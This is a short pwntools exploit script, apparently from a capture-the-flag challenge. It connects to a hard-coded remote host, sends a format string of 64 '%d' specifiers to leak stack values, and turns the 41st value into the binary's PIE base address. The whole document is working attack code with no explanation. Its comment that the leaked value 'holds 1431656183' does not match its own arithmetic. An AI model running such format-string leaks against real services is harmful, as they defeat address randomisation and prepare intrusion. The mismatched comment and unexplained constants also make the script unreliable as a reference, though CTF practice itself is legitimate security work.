from pwn import *

elf = context.binary = ELF("./memory-lost_patched")

for i in range(1):  # Runs once
    r = remote("178.128.29.224",9481)
    # Send the format string with 64 %d specifiers
    r.sendline("%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d")
    r.recvuntil(b"-------------------------------------------\n\n")  # Wait for delimiter
    output = r.recvline()  # Capture the output line
    log.info(f"Output: {output}")
    
    # Decode bytes to string, split into list, and convert to integers
    numbers = [int(x) for x in output.decode().split()]
    
    # Extract the 41st element (0-based index 40)
    leak_addr = numbers[40] + 93823560581120
    log.info(f"Leaked address: {hex(leak_addr)}")
    
    r.close()

# Now leak_addr holds 1431656183
print(f"leak_addr = {leak_addr}")
base_address = leak_addr - 0x16f7
log.info(hex(base_address))